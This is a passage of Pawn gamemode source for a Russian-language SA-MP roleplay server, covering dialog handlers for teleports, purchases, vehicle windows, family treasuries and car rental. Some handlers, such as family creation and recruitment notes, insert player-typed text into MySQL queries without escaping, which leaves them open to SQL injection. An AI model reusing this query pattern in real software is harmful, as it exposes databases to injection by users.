				SendClientMessage(playerid,CGREY,"Игрок не в вашей фракции");
				mysql_free_result();
				return true;
			}
			SetPlayerInt(nick, "member", 0);
			SetPlayerInt(nick, "rank", 0);
			static const fmt_string2[] = "Вы уволили %s оффлайн";
			new str2[sizeof(fmt_string2)+MAX_PLAYER_NAME];
			format(str2, sizeof(str2), fmt_string2,nick);
			SendClientMessage(playerid,CBLUE,str2);
			mysql_free_result();*/
		    
		}
		case 221:
		{
		    if(!response) return cmd_gps(playerid,"");
            switch(listitem)
            {
                case 0: SetPlayerRaceCheckpoint(playerid,2,1726.2125,1864.4169,10.8203,0,0,0,10); //avto n
                case 1: SetPlayerRaceCheckpoint(playerid,2,-2466.2429,2237.9539,4.4758,0,0,0,10); //avto n 2
                case 2: SetPlayerRaceCheckpoint(playerid,2,-1515.4027,2539.0742,55.6875,0,0,0,10); //avto b
                case 3: SetPlayerRaceCheckpoint(playerid,2,2106.7644,1385.1018,10.8203,0,0,0,10); //avto a
            }
            SetPVarInt(playerid,"GPS",1);
		}
		case 222:
		{
		    if(!response) return cmd_tp(playerid,"");
            switch(listitem)
            {
      			case 0: SetPlayerPos(playerid,1726.2125,1864.4169,10.8203); //avto n
      			case 1: SetPlayerPos(playerid,-2466.2429,2237.9539,4.4758); //avto n 2
                case 2: SetPlayerPos(playerid,-1515.4027,2539.0742,55.6875); //avto b
                case 3: SetPlayerPos(playerid,2106.7644,1385.1018,10.8203); //avto a
            }
		}
        case 223:
		{
		    if(!response)
		    {
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bProd] < GetPVarInt(playerid,"AmmoProd"))
		    {
		        SendClientMessage(playerid,CGREY,"В магазине кончились продукты");
		        DeletePVar(playerid,"AmmoGun");
		        DeletePVar(playerid,"AmmoPrice");
		        return true;
		    }
		    if(!GetPVarInt(playerid,"Oplata"))
      		{
				if(PlayerInfo[playerid][pCash] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			else
			{
				if(PlayerInfo[playerid][pBank] < GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")))
				{
			        SendClientMessage(playerid,CGREY,"Недостаточно средств");
			        DeletePVar(playerid,"AmmoGun");
			        DeletePVar(playerid,"AmmoPrice");
			        return true;
				}
			}
			GivePlayerWeapon(playerid,41,1000);
			if(!GetPVarInt(playerid,"Oplata")) GiveMoney(playerid,-GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")));
			else PlayerInfo[playerid][pBank] -= GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice"));
			
   			BizMinus(GetPVarInt(playerid,"PBIZ"),GetCena(GetPVarInt(playerid,"PBIZ"),GetPVarInt(playerid,"AmmoPrice")),GetPVarInt(playerid,"AmmoProd"));
			ApplyDynamicActorAnimation(BIZBOT[GetPVarInt(playerid,"PBIZ")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BotLable[GetPVarInt(playerid,"PBIZ")],-1,"Спасибо за покупку");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BIZBOT[GetPVarInt(playerid,"PBIZ")],_:BotLable[GetPVarInt(playerid,"PBIZ")]);
			SendClientMessage(playerid,CREWARD,"Вы приобрели балончик с краской.");
   			DeletePVar(playerid,"AmmoGun");
      		DeletePVar(playerid,"AmmoPrice");
		}
		case 225:
		{
		    if(!response)
			{
			    DeletePVar(playerid,"Days");
				return true;
			}
			new textd[60];
		    //  return ShowPlayerDialog(playerid,225,DIALOG_STYLE_INPUT,"Объявить набор","{ffffff}Введите примечания для набора:\n\n","Далее","Отмена");
			if(GetPlayerInterior(playerid) || GetPlayerVirtualWorld(playerid))
			{
			    DeletePVar(playerid,"Days");
			    return SendClientMessage(playerid,CGREY,"Использовать можно только на улице!");
			}
			new text[30];
			GetPVarString(playerid, "Days", text, sizeof(text));
			printf(text);
			new date[5];
			sscanf(text,"p<,>ddddd",date[0],date[1],date[2],date[3],date[4]);
			printf("%d %d",date[3],date[4]);
			format(text,sizeof(text),"%d,%d,%d",date[0],date[1],date[2]);
			FracInfo[PlayerInfo[playerid][pMember]][fNabor] = DateToTimestamp(text)+60*60*date[3]+60*date[4];
			if(!sscanf(inputtext, "s[60]",textd)) strmid(FracInfo[PlayerInfo[playerid][pMember]][fNaborText], textd, 0, strlen(textd), 60);
			new str[100];
			new Float:x,Float:y,Float:z;
			GetPlayerPos(playerid,x,y,z);
			FracInfo[PlayerInfo[playerid][pMember]][fNaborPos][0] = x;
			FracInfo[PlayerInfo[playerid][pMember]][fNaborPos][1] = y;
			FracInfo[PlayerInfo[playerid][pMember]][fNaborPos][2] = z;
			query = "";
			format(query, sizeof(query), "UPDATE `fraction` SET `nabor` = '%d',`nabortext` = '%s' \
			,`naborx` = '%.1f',`nabory` = '%.1f',`naborz` = '%.1f' WHERE id = '%d' LIMIT 1",FracInfo[PlayerInfo[playerid][pMember]][fNabor],
			(!strlen(text)) ? ("None") : (textd),x,y,z,PlayerInfo[playerid][pMember]);
			mysql_tquery(mysql,query);
			format(str, sizeof(str),"Вы объявили набор %02d.%02d.%02d в %02d:%02d! Примечания: %s",date[0],date[1],date[2],date[3],date[4],textd);
			SendClientMessage(playerid,CBLUE,str);
			SendClientMessage(playerid,CBLUE,"Для отмены используйте: /lpanel » Объявить набор");
			DeletePVar(playerid,"Days");
		}
		case 227:
		{
		    if(!response) return true;
		    //static const fmt_string1[] = "Багажник\t\t%s{FFFFFF}\nКапот\t\t%s{FFFFFF}\nФары\t\t%s{FFFFFF}\nОкна\t\t%i";
		    new v = GetPlayerVehicleID(playerid);
		    if(v == INVALID_VEHICLE_ID) return true;
		    new eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective;
		    switch(listitem)
		    {
		        case 0:
		        {
		            new i = GetPlayerVehicleID(playerid);
                    new car = -1;
					for(new x = 1; x <= TOTALVEH;  x++)
					{
		   				if(i != VehInfo[x][vVehicle]) continue;
						car = x;
					}
					if(car != -1 && VehInfo[car][vFr] != PlayerInfo[playerid][pMember]) return SendClientMessage(playerid,CGREY,"Данный транспорт пренадлежит не Вашей организации");
	      		    CarTrunk(i,(!BInfo[i][bLock]) ? (0) : (1));
	      		    return 1;
		        }
		        case 1:
		        {
		            if(Capot[v] == false)
		            {
						GetVehicleParamsEx(v, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
						SetVehicleParamsEx(v, eengine, elights, ealarm, edoors, VEHICLE_PARAMS_ON, eboot, eobjective);
						Capot[v] = true;
		            }
		            else
		            {
						GetVehicleParamsEx(v, eengine, elights, ealarm, edoors, ebonnet, eboot, eobjective);
						SetVehicleParamsEx(v, eengine, elights, ealarm, edoors, VEHICLE_PARAMS_OFF, eboot, eobjective);
						Capot[v] = false;
		            }
		        }
		        case 2:
		        {
		            SetLights(playerid,v,(!Lights[v]) ? (true) : (false));
		        }
		        case 3:
		        {
		            static const fmt_string1[] = "Переднее слева:\t%s{FFFFFF}\nПереднее справа:\t%s{FFFFFF}\nЗаднее слева:\t%s{FFFFFF}\nЗаднее справа:\t%s{FFFFFF}";
					new str1[sizeof(fmt_string1)+15*4];
					format(str1, sizeof(str1), fmt_string1,(!Okna[v][0]) ? ("{F85A5A}[Закрыто]"):("{20BA09}[Открыто]"),(!Okna[v][1]) ? ("{F85A5A}[Закрыто]"):("{20BA09}[Открыто]"),(!Okna[v][2]) ? ("{F85A5A}[Закрыто]"):("{20BA09}[Открыто]"),(!Okna[v][3]) ? ("{F85A5A}[Закрыто]"):("{20BA09}[Открыто]"));
		            ShowPlayerDialog(playerid,228,DIALOG_STYLE_TABLIST,"Управление машиной",str1,"Далее","Назад");
		        }
		    }
		}
		case 228:
		{
			if(!response) return cmd_car(playerid);
			new driver, passenger, backleft, backright,status;
			if(Okna[GetPlayerVehicleID(playerid)][listitem] == false) status = 0,Okna[GetPlayerVehicleID(playerid)][listitem] = true;
			else status = 1,Okna[GetPlayerVehicleID(playerid)][listitem] = false;
			switch(listitem)
			{
			    case 0:
			    {
			        GetVehicleParamsCarWindows(GetPlayerVehicleID(playerid), driver, passenger, backleft, backright);
			        SetVehicleParamsCarWindows(GetPlayerVehicleID(playerid), status, passenger, backleft, backright);
			    }
			    case 1:
			    {
			        GetVehicleParamsCarWindows(GetPlayerVehicleID(playerid), driver, passenger, backleft, backright);
			        SetVehicleParamsCarWindows(GetPlayerVehicleID(playerid), driver, status, backleft, backright);
			    }
			    case 2:
			    {
			        GetVehicleParamsCarWindows(GetPlayerVehicleID(playerid), driver, passenger, backleft, backright);
			        SetVehicleParamsCarWindows(GetPlayerVehicleID(playerid), driver, passenger, status, backright);
			    }
			    case 3:
			    {
			        GetVehicleParamsCarWindows(GetPlayerVehicleID(playerid), driver, passenger, backleft, backright);
			        SetVehicleParamsCarWindows(GetPlayerVehicleID(playerid), driver, passenger, backleft, status);
			    }
			}
		}
		case 229:
		{
		    if(!response) return cmd_lpanel(playerid);
		    new nick;
		    if(sscanf(inputtext,"i",nick) || nick < 10 || nick > 50) return ShowPlayerDialog(playerid,229,DIALOG_STYLE_INPUT,"Цена за объявление","{FFFFFF}Введите цену за одно объявление:\nОт 10$ до 50$","Далее","Отмена");
		    AdCena = nick;
		    SetMatsInt("AdCena",nick);
		    static const fmt_string2[] = "Новая цена за 1 символ в объявлении %i$";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,nick);
			SendGov(playerid,str2);
		}
		case 230:
		{
		    if(!response) return cmd_lpanel(playerid);
		    new nick;
		    if(sscanf(inputtext,"i",nick) || nick < 10 || nick > 80) return ShowPlayerDialog(playerid,230,DIALOG_STYLE_INPUT,"Цена за SMS","{FFFFFF}Введите цену за SMS:\nОт 10$ до 80$","Далее","Отмена");
		    AdSms = nick;
		    SetMatsInt("AdSms",nick);
			static const fmt_string2[] = "Новая цена за SMS в студию %i$";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,nick);
			SendGov(playerid,str2);
		}
		case 231:
		{
		    if(!response) return cmd_lpanel(playerid);
		    new nick;
		    if(sscanf(inputtext,"i",nick) || nick < 10 || nick > 80) return ShowPlayerDialog(playerid,231,DIALOG_STYLE_INPUT,"Цена за звонок","{FFFFFF}Введите цену за звонок:\nОт 10$ до 80$","Далее","Отмена");
		    AdZvon = nick;
		    SetMatsInt("AdZvon",nick);
			static const fmt_string2[] = "Новая цена за звонок в студию %i$";
			new str2[sizeof(fmt_string2)+3];
			format(str2, sizeof(str2), fmt_string2,nick);
			SendGov(playerid,str2);
		}
		case 232:
		{
		    if(!response) return true;
		    new nick[51];
		    if(sscanf(inputtext,"s[50]",nick) || strlen(nick) < 1 || strlen(nick) > 50) return ShowPlayerDialog(playerid,232,DIALOG_STYLE_INPUT,"Создание семьи","{FFFFFF}Введите название семьи:\nНазвание семьи должно быть от 1 до 50.","Далее","Назад");
		    if(PlayerInfo[playerid][pDonate] < 250) return SendClientMessage(playerid,CGREY,"Недостаточно доната");
		    if(PlayerInfo[playerid][pFam] > 0) return SendClientMessage(playerid,CGREY,"Вы уже состоите в семье");
		    PlayerInfo[playerid][pDonate] -= 250;
		    TOTALFAM++;
		    strmid(FamInfo[TOTALFAM][fName], nick, 0, strlen(nick), 50);
		    strmid(FamInfo[TOTALFAM][fLeader], PlayerInfo[playerid][pSendername], 0, strlen(PlayerInfo[playerid][pSendername]), MAX_PLAYER_NAME);
		    PlayerInfo[playerid][pFam] = TOTALFAM;
		    SetPlayerInt(PlayerInfo[playerid][pSendername],"fam",PlayerInfo[playerid][pFam]);
		    static const fmt_string2[] = "Вы создали семью %s. Команды семьи: /mm » Команды сервера » Семья";
			new str2[sizeof(fmt_string2)+50];
			format(str2, sizeof(str2), fmt_string2,nick);
			SendClientMessage(playerid,CREWARD,str2);
			FamInfo[TOTALFAM][fColor] = 0x4AD4A6FF;
			query = "";
			format(query,sizeof(query),"INSERT INTO `fam` ( `name`, `leader`, `color`) VALUES ('%s', '%s', '%d')",nick,PlayerInfo[playerid][pSendername],FamInfo[TOTALFAM][fColor]);
			mysql_tquery(mysql,query);
		    
		}
		case 233:
		{
		    if(!response) return true;
		    switch(listitem)
		    {
		        case 0:
		        {
		            query = "";
		            format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE fam = '%d'", PlayerInfo[playerid][pFam]);
					mysql_tquery(mysql, query, "ShowAllFamily", "d", playerid);
					

		         /*   new srrt[1500];
		            format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE fam = '%d'", PlayerInfo[playerid][pFam]);
					mysql_tquery(mysql,query);
					mysql_store_result();
				    if(mysql_num_rows() > 0)
				    {
						for(new i = 1; i <= mysql_num_rows();i++)
						{
							mysql_fetch_row(query);
							new sos[32];
							mysql_get_field("name", sos);
							new stttt[20];
							if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], sos, true) == 0) stttt = " - Лидер";
							else stttt = "";
							new str[32+5+20];
						    format(str,sizeof(str),"%s%s\n",sos,stttt);
							strcat(srrt, str);
						}
			   			mysql_free_result();
						ShowPlayerDialog(playerid,0,DIALOG_STYLE_LIST,"Состав семьи",srrt,"Далее","");
				    }*/
          		}
          		case 1:
		        {
                    query = "";
                    new stttt[20];
                    new str[32+5+20];
                    for(new i = 0; i < MAX_PLAYERS; i++)
					{
						if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
						if(PlayerInfo[i][pFam] == PlayerInfo[playerid][pFam])
						{
						    
							if(strcmp(FamInfo[PlayerInfo[playerid][pFam]][fLeader], PlayerInfo[i][pSendername], true) == 0) stttt = " - Лидер";
							else stttt = "";
							
						    format(str,sizeof(str),"%s%s\n",PlayerInfo[i][pSendername],stttt);
							strcat(query,str);
						}
					}
					ShowPlayerDialog(playerid,0,DIALOG_STYLE_LIST,"Члены семьи онлайн",query,"Далее","");
		        }
		        case 2:
		        {
            		new str[30+5];
				    format(str,sizeof(str),"{FFFFFF}В общаке семьи: {f7ae11}%i$",FamInfo[PlayerInfo[playerid][pFam]][fKazna]);
					ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Общак семьи",str,"Далее","");
		        }
		        case 3:
		        {
		            new str[50];
		            query = "";
	            	for(new i = 1; i<= TOTALV; i++)
				   	{
				   		if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
				   	    if(VInfo[i][vfam] != PlayerInfo[playerid][pFam]) continue;
			   	        format(str,sizeof(str),"%s\n",VehicleNameS[VInfo[i][vmodel]-400]);
	                	strcat(query,str);
				   	}
					if(!strlen(query)) ShowPlayerDialog(playerid,0,DIALOG_STYLE_LIST,"Автопарк","{ffffff}Автопарк пуст","Далее","");
					else ShowPlayerDialog(playerid,0,DIALOG_STYLE_LIST,"Автопарк",query,"Далее","");
		            
		        }
		        case 4: ShowSetFam(playerid);
		        case 5: ShowFamUl(playerid);
		    }
		    
		}

		case 234:
		{
		    if(!response || PlayerInfo[playerid][pFam] == 0) return true;
		    new nick;
		    if(sscanf(inputtext,"i",nick) || nick < 0) return ShowPlayerDialog(playerid, 234, DIALOG_STYLE_INPUT, "Полонить общак семьи","{FFFFFF}Укажите сумму пополнения общака семьи:" , "Готово","Назад");
            if(PlayerInfo[playerid][pCash] < nick) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
			FamInfo[PlayerInfo[playerid][pFam]][fKazna] += nick;
			GiveMoney(playerid,-nick);
		    static const fmt_string[] = "[%s] %s пополнил общак семьи на %i$";
			new str[sizeof(fmt_string)+50+32+5];
			format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername],nick);
			SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
			query = "";
		    format(query, sizeof(query), "UPDATE `fam` SET `kazna` = %d WHERE id = '%d' LIMIT 1",FamInfo[PlayerInfo[playerid][pFam]][fKazna],PlayerInfo[playerid][pFam]);
			mysql_tquery(mysql,query);
		}
		case 235:
		{
		    if(!response || PlayerInfo[playerid][pFam] == 0) return true;
		    new nick;
		    if(sscanf(inputtext,"i",nick) || nick < 0) return ShowPlayerDialog(playerid, 235, DIALOG_STYLE_INPUT, "Снять с общака семьи","{FFFFFF}Укажите сумму снятия с общака семьи:" , "Готово","Назад");
			if(FamInfo[PlayerInfo[playerid][pFam]][fKazna] < nick) return SendClientMessage(playerid,CGREY,"Недостаточно средств в общаке");
			FamInfo[PlayerInfo[playerid][pFam]][fKazna] -= nick;
			GiveMoney(playerid,nick);
		    static const fmt_string[] = "[%s] %s снял с общака семьи %i$";
			new str[sizeof(fmt_string)+50+32+5];
			format(str, sizeof(str), fmt_string,FamInfo[PlayerInfo[playerid][pFam]][fName],PlayerInfo[playerid][pSendername],nick);
			SendFamMessage(PlayerInfo[playerid][pFam],FamInfo[PlayerInfo[playerid][pFam]][fColor],str);
			query = "";
		    format(query, sizeof(query), "UPDATE `fam` SET `kazna` = %d WHERE id = '%d' LIMIT 1",FamInfo[PlayerInfo[playerid][pFam]][fKazna],PlayerInfo[playerid][pFam]);
			mysql_tquery(mysql,query);
		}
		case 237:
		{
		    if(!response) return true;
			new str1[5];
		    format(str1,sizeof(str1),"obj%i",listitem);
		    if(GetPVarInt(playerid,str1) == 0)
			{
			    query = "";
			    for(new i = 0; i < sizeof(Object); i++)
			    {
					strcat(query,ObjectName[i]);
					strcat(query,"\n");
				}
				ShowPlayerDialog(playerid,238,DIALOG_STYLE_LIST,"Поставить объект",query,"Далее","Отмена");
				SetPVarInt(playerid,"Sas",ListNick[playerid][listitem]);
			}
		    else
			{
                SendClientMessage(playerid,CBLUE,"Вы удалили объект");
				if(PlayerInfo[playerid][pObjectSp])
				{
					DestroyDynamicArea(PlayerInfo[playerid][pObjectSp]);
					PlayerInfo[playerid][pObjectSp]= 0;
				}
				DestroyDynamicObject(PlayerInfo[playerid][pObject][ListNick[playerid][listitem]]);
                PlayerInfo[playerid][pObject][ListNick[playerid][listitem]] = 0;
				DestroyDynamic3DTextLabel(PlayerInfo[playerid][pLable][ListNick[playerid][listitem]]);
			}
			DeletePVar(playerid,str1);
		}
		case 238:
		{
		    if(!response) return DeletePVar(playerid,"Sas");
		    if(listitem == 5 && PlayerInfo[playerid][pObjectSp]) return SendClientMessage(playerid,CGREY,"Вы можете поставить только одни шипы!");
		    new Float:x,Float:y,Float:z;
		    GetPlayerPos(playerid,x,y,z);
		    SetPVarInt(playerid,"Object",listitem+1);
		    new obj = CreateDynamicObject(Object[listitem],x,y+2,z,0.0,0.0,0.0);
		    EditDynamicObject(playerid,obj);
		    SendClientMessage(playerid,CBLUE,"Установите объект и нажмите на иконку 'Сохранить'");
		}
		case 239:
		{
		    if(!response) return true;
			SetPVarInt(playerid,"Car",ListNick[playerid][listitem]);
			ApplyDynamicActorAnimation(BankBot[GetPVarInt(playerid,"BankBot")],"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(BankText[GetPVarInt(playerid,"BankBot")],-1,"На сколько хотите оплатить транспорт?");
			SetTimerEx("ClearBotGlobal", 3000, false, "dd", BankBot[GetPVarInt(playerid,"BankBot")],_:BankText[GetPVarInt(playerid,"BankBot")]);
			ShowPlayerDialog(playerid, 240, DIALOG_STYLE_INPUT, "На сколько хотите оплатить?","{FFFFFF}Введите на сколько хотите оплатить транспорт:\nОт 1 до 30 дней." , "Выбор","Назад");
		}
		case 240:
		{
		    if(!response) return DeletePVar(playerid,"Car");
   			new krek;
		    if(sscanf(inputtext,"i",krek) || krek < 1 || krek > 30) return ShowPlayerDialog(playerid, 240, DIALOG_STYLE_INPUT, "На сколько хотите оплатить?","{FFFFFF}Введите на сколько хотите оплатить транспорт:\nОт 1 до 30 дней." , "Выбор","Назад");
            if(VInfo[GetPVarInt(playerid,"Car")][voplata]> gettime()+60*60*24*krek) return InfoOplCar(playerid);
		    if(strcmp(VInfo[GetPVarInt(playerid,"Car")][vnumber], "Nope", true) == 0) SetPVarInt(playerid,"Skoka",(NalogTS*24*krek)*2);
			else SetPVarInt(playerid,"Skoka",(VInfo[GetPVarInt(playerid,"Car")][vcost]*NalogTS/100)*krek);
			static const fmt_str[] = "{FFFFFF}Стоимость платы за транспорт на %i дн. составит: $%i\nОплатить?";
			SetPVarInt(playerid,"Skoka1",60*60*24*krek);
			new string[sizeof(fmt_str)+10];
			format(string, sizeof(string), fmt_str, krek,GetPVarInt(playerid,"Skoka"));
			ShowPlayerDialog(playerid,241,DIALOG_STYLE_MSGBOX,"Оплата транспорта",string,"Да","Нет");
		}
		case 241:
		{
		    if(!response) return DeletePVar(playerid,"Skoka");
		    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"Skoka")) return SendClientMessage(playerid,CGREY,"У вас недостаточно средств");
			if(VInfo[GetPVarInt(playerid,"Car")][voplata] <= 0) VInfo[GetPVarInt(playerid,"Car")][voplata] = gettime() + GetPVarInt(playerid,"Skoka1");
			else
			{
			    new k = VInfo[GetPVarInt(playerid,"Car")][voplata] - gettime();
			    VInfo[GetPVarInt(playerid,"Car")][voplata] = gettime() + GetPVarInt(playerid,"Skoka1") + k;
			}
	//		VInfo[GetPVarInt(playerid,"Car")][vpros] = 0;
		    GiveMoney(playerid,-GetPVarInt(playerid,"Skoka"));
		    Kazna += GetPVarInt(playerid,"Skoka");
		    SetMatsInt("kazna",Kazna);
			static const fmt_str[] = "Вы внесли плату за транспорт на: %s Стоимость: $%i";
			new string[sizeof(fmt_str)+10+10+5];
			format(string, sizeof(string), fmt_str, timec(gettime()+GetPVarInt(playerid,"Skoka1")),GetPVarInt(playerid,"Skoka"));
			SendClientMessage(playerid,CREWARD,string);
			query = "";
			format(query, sizeof(query), "UPDATE veh SET oplata = %i, pros = 0 WHERE id = '%d' LIMIT 1",VInfo[GetPVarInt(playerid,"Car")][voplata],VInfo[GetPVarInt(playerid,"Car")][id]);
			mysql_tquery(mysql,query);
			DeletePVar(playerid,"Skoka");
			DeletePVar(playerid,"Skoka1");
		}
		case 242:
		{
		    if(!response) return true;
  			new nick;
		    if(sscanf(inputtext,"i",nick) || !IsValidDynamicObject(nick)) return ShowPlayerDialog(playerid,242,DIALOG_STYLE_INPUT,"Удалить установленный объект","{FFFFFF}Введите ID объект, который хотите удалить:\n","Далее","Отмена");
			new obj = -1,idobj;
			for(new i = 0; i < MAX_PLAYERS; i++)
		    {
		        if(PlayerInfo[i][pObject][0] == nick)
		        {
		            obj = i,idobj = 0;
		            break;
		        }
		        else if(PlayerInfo[i][pObject][1] == nick)
		        {
		            obj = i,idobj = 1;
		            break;
		        }
		        else if(PlayerInfo[i][pObject][2] == nick)
		        {
		            obj = i,idobj = 2;
		            break;
		        }
		        else if(PlayerInfo[i][pObject][3] == nick)
		        {
		            obj = i,idobj = 3;
		            break;
		        }
		        else if(PlayerInfo[i][pObject][4] == nick)
		        {
		            obj = i,idobj = 4;
		            break;
		        }
		    }
			if(obj == -1) return ShowPlayerDialog(playerid,242,DIALOG_STYLE_INPUT,"Удалить установленный объект","{FFFFFF}Введите ID объект, который хотите удалить:\n","Далее","Отмена");
			DestroyDynamicObject(PlayerInfo[obj][pObject][idobj]);
			DestroyDynamic3DTextLabel(PlayerInfo[obj][pLable][idobj]);
			PlayerInfo[obj][pObject][idobj] = 0;
			SendClientMessage(playerid,CBLUE,"Вы удалили установленный объект");
			//fSendClientMessage(obj,CBLUE,"Лидер удалили Ваш установленный объект");
		}
		case 243:
		{
		    if(!response) return true;
		    if(StartReg == 0) return SendClientMessage(playerid,CGREY,"Регистрация закрыта");
		    if(GetPVarInt(playerid,"DriftReg") > 0) return SendClientMessage(playerid,CGREY,"Вы уже зарегистрированы");
		    if(PlayerInfo[playerid][pCash] < 50) return SendClientMessage(playerid,CGREY,"Недостаточно средств");
		    GiveMoney(playerid,-50);
			SetPVarInt(playerid,"DriftReg",1);
			SendClientMessage(playerid,CYELLOW,"Вы зарегистрировались");
   			if(GetOnlineDrift() == 14) StartDrift();
		}
		case 247:
		{
		    if(!response) return true;
		    SetPVarInt(playerid,"TS",ListNick[playerid][listitem]);
	    	if(PlayerInfo[playerid][pShtrav] > 0) return SendClientMessage(playerid,CGREY,"У Вас имеются неоплаченые штрафы");
	    	if(VInfo[ListNick[playerid][listitem]][vxmag] == 0) return SendClientMessage(playerid,CGREY,"Данный транспрот нельзя продать");
	    	static const fmt_strin3[] = "Даю $%i за твою развалюху";
			new str3[sizeof(fmt_strin3)+10];
			format(str3, sizeof(str3), fmt_strin3,VInfo[ListNick[playerid][listitem]][vcost]/2);
	    	ApplyDynamicActorAnimation(UtilBot,"PED","IDLE_CHAT",4.0,0,0,0,0,0);
			Update3DTextLabelTextEx(UtilText,-1,str3);
			SetTimerEx("ClearBotGlobal", 3000, false,"dd",UtilBot,_:UtilText);
			static const fmt_string2[] = "{FFFFFF}Вы действительно хотите продать свой транспорт\nи получить в замен половину от гос. стоимости?\nВы получите:{f7ae11}\n$%i{FFFFFF}\nОтдадите:\n{f7ae11}%s";
			new str2[sizeof(fmt_string2)+32+10];
			format(str2, sizeof(str2), fmt_string2,VInfo[ListNick[playerid][listitem]][vcost]/2,VehicleNameS[VInfo[ListNick[playerid][listitem]][vmodel]-400]);
			ShowPlayerDialog(playerid,85,DIALOG_STYLE_MSGBOX,"Продажа транспорта",str2,"Да","Нет");
		
		}
		case 248:
		{
		    if(!response) return RemovePlayerFromVehicle(playerid);
		    if(PlayerInfo[playerid][pCash] < GetPVarInt(playerid,"Arenda"))
			{
			 	SendClientMessage(playerid,CGREY,"Недостаточно средств");
			 	RemovePlayerFromVehicle(playerid);
			 	return true;
		 	}
			GiveMoney(playerid,-GetPVarInt(playerid,"Arenda"));
			Locked[GetPlayerVehicleID(playerid)] = playerid;
			SendClientMessage(playerid,CREWARD,"Вы арендовали автомобиль!");
			SendClientMessage(playerid,CREWARD,"Закрыть транспорт: /lock | Разорвать договор аренды: /unrent");
			new band = PlayerInfo[playerid][pGrabTeam];
			if(band)
			{
				if(BankGrab[band][bGrab] && !BankGrab[band][bGrabStatus])
				{
				    if(!BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown]) SetPlayerRaceCheckpoint(playerid,2,1501.9181,-1028.4258,23.4921,0,0,0,10); //mayor
				    else SetPlayerRaceCheckpoint(playerid,2,2487.9097,2238.5088,10.4348,0,0,0,10);
                    SendBandMes(band,CREWARD,"Отправляйтесь к зданию банка!");
				    SetPVarInt(playerid,"GrabQuestW",1);
					SetPVarInt(playerid,"GPS",1);
					BankGrab[band][bVeh] = GetPlayerVehicleID(playerid);
					BankGrab[band][bGrabStatus]  = 1;
				}
			}
			RentCar[GetPlayerVehicleID(playerid)] = playerid;
			SetPVarInt(playerid,"RentCar",GetPlayerVehicleID(playerid));
			DeletePVar(playerid,"Arenda");
			for(new i = 0;i< MAX_VEHICLES;i++) if(RentCar[i] == playerid && i != GetPlayerVehicleID(playerid)) SetVehicleToRespawn(i);
		}
		case 249:
		{
		    if(!response) return true;
		    //ShowPlayerDialog(playerid,249,DIALOG_STYLE_LIST,"Радио","Europa Plus\nDFM\nRadio Record\nРадио Шансон\nВыключить радио","Далее","Назад");
		    switch(listitem)
		    {
		        case 0: PlayAudioStreamForPlayer(playerid,"http://ep128.hostingradio.ru:8030/ep128");
		        case 1: PlayAudioStreamForPlayer(playerid,"http://dfm.fmtuner.ru/;stream.nsv");
		        case 2: PlayAudioStreamForPlayer(playerid,"http://nashe2.hostingradio.ru/nashe-128.mp3");
		        case 3: PlayAudioStreamForPlayer(playerid,"http://icecast.chanson.cdnvideo.ru:8000/chanson_128_pm.mp3");
		        case 4: StopAudioStreamForPlayer(playerid);
		    }
		}
		case 250:
		{
		    if(!response) return true;
		    switch(GetPVarInt(playerid,"Povar"))
		    {
		        case 0:
		        {
		            if(GetPVarInt(playerid,"Gruz") > 0)
					{
						DeletePVar(playerid,"Gruz");
						DeletePVar(playerid,"GruzW");
						DisablePlayerCheckpoint(playerid);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
						DeletePVar(playerid,"GruzC");
					}
         			if(GetPVarInt(playerid,"Pes") > 0)
					{
						DeletePVar(playerid,"Pes");
						DeletePVar(playerid,"PesW");
						DisablePlayerCheckpoint(playerid);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
						if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
						if(IsValidDynamicCP(GetPVarInt(playerid,"PesCheck"))) DestroyDynamicCP(GetPVarInt(playerid,"PesCheck")),DeletePVar(playerid,"PesCheck");
     					if(IsValidDynamicPickup(GetPVarInt(playerid,"PesPick"))) DestroyDynamicPickup(GetPVarInt(playerid,"PesPick")),DeletePVar(playerid,"PesPick");
						DeletePVar(playerid,"PesC");
					}
					if(GetPVarInt(playerid,"Povar") > 0)
					{
						DeletePVar(playerid,"Povar");
						DeletePVar(playerid,"PovarW");
						DisablePlayerCheckpoint(playerid);
						DeletePVar(playerid,"PovarC");
						DeletePVar(playerid,"PovarM");
						if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
